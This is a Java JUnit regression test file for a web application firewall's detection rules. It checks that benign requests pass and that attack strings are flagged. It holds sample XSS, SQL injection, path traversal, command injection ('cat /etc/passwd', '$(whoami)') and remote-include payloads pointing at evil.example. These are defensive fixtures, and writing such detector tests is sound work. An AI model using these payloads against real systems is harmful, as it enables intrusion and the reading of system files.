package com.example.waf.detector.service.impl;

import com.example.waf.detector.model.Event;
import com.example.waf.detector.model.RuleMatch;
import com.example.waf.detector.service.RuleEngineService;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Hồi quy cho các lỗi phát hiện đã kiểm chứng khi review nhánh lienntp. */
class RuleRegressionTest {
    private static final RuleEngineService RULES = new RuleEngineServiceImpl();

    private static Event event(String path, String query, Map<String, String> headers) {
        return new Event("e", "2026-10-04T08:00:00Z", "shop.local", "10.0.0.1", "GET", path,
                query, "", "Mozilla/5.0", 200, headers);
    }

    private static List<String> groups(Event event) {
        return RULES.match(event).stream().map(RuleMatch::type).distinct().toList();
    }

    @Test
    void legitimateParametersAndCookiesAreNotXss() {
        assertEquals(List.of(), groups(event("/blog", "content=hello", Map.of())));
        assertEquals(List.of(), groups(event("/settings", "config=dark", Map.of())));
        assertEquals(List.of(), groups(event("/products", "condition=new&contact=1", Map.of())));
        assertEquals(List.of(), groups(event("/", "", Map.of("cookie", "consent=yes; theme=dark"))));
    }

    @Test
    void realXssPayloadsStillDetected() {
        assertTrue(groups(event("/search", "q=%3Csvg%20onload%3Dalert(1)%3E", Map.of())).contains("xss"));
        assertTrue(groups(event("/search", "q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", Map.of()))
                .contains("xss"));
        assertTrue(groups(event("/search", "q=%3Cscript%3Ealert(1)%3C/script%3E", Map.of())).contains("xss"));
    }

    @Test
    void sqlInjectionWithTabOrNewlineIsDetected() {
        assertTrue(groups(event("/p", "id=1%09UNION%09SELECT%09x", Map.of())).contains("sql_injection"));
        assertTrue(groups(event("/p", "id=1%0aUNION%0aSELECT%0ax", Map.of())).contains("sql_injection"));
        assertTrue(groups(event("/p", "id=1%27%20OR%20%271%27%3D%271", Map.of())).contains("sql_injection"));
    }

    @Test
    void backslashTraversalIsDetected() {
        assertTrue(groups(event("/download", "file=..%5C..%5Cwindows%5Cwin.ini", Map.of()))
                .contains("path_traversal"));
    }

    @Test
    void scannerUserAgentIsDetectedFromHeader() {
        assertTrue(groups(event("/", "", Map.of("user-agent", "sqlmap/1.8"))).contains("scanner"));
    }

    @Test
    void matchCarriesEvidence() {
        RuleMatch match = RULES.match(event("/p", "id=1%20UNION%20SELECT%20pw", Map.of())).get(0);
        assertTrue(match.matchedValue().toUpperCase().contains("UNION SELECT"), match.toString());
        assertTrue(!match.description().isBlank(), match.toString());
    }

    @Test
    void defaultRuleSetCoversAllTenGroups() {
        RuleEngineServiceImpl engine = new RuleEngineServiceImpl();
        assertEquals(20, engine.ruleCount());
    }

    @Test
    void commandInjectionRuleIgnoresUserAgentsAndMatrixParams() {
        assertEquals(List.of(), groups(event("/", "",
                Map.of("user-agent", "Mozilla/5.0 (Linux; Android 9; SH-03K) AppleWebKit/537.36"))));
        assertEquals(List.of(), groups(event("/", "",
                Map.of("user-agent", "Mozilla/5.0 (Linux; U; Android 11; id-id; Redmi) Chrome/120"))));
        assertEquals(List.of(), groups(event("/item;id=42", "", Map.of())));
        assertTrue(groups(event("/api/x", "cmd=1;cat%20/etc/passwd", Map.of())).contains("command_injection"));
        assertTrue(groups(event("/api/x", "q=a%7Cls%20-la", Map.of())).contains("command_injection"));
        assertTrue(groups(event("/api/x", "q=%24(whoami)", Map.of())).contains("command_injection"));
    }

    @Test
    void remoteIncludeRuleRequiresIncludeStyleParameterName() {
        assertEquals(List.of(), groups(event("/login", "redirect_url=https%3A%2F%2Fexample.com%2F", Map.of())));
        assertEquals(List.of(), groups(event("/login", "return_url=https://example.com/", Map.of())));
        assertEquals(List.of(), groups(event("/p", "img_src=https://cdn.example.com/a.png", Map.of())));
        assertTrue(groups(event("/api/load", "page=http://evil.example/shell.txt", Map.of())).contains("rfi"));
        assertTrue(groups(event("/api/load", "a=1&file=http://evil.example/x", Map.of())).contains("rfi"));
    }
}
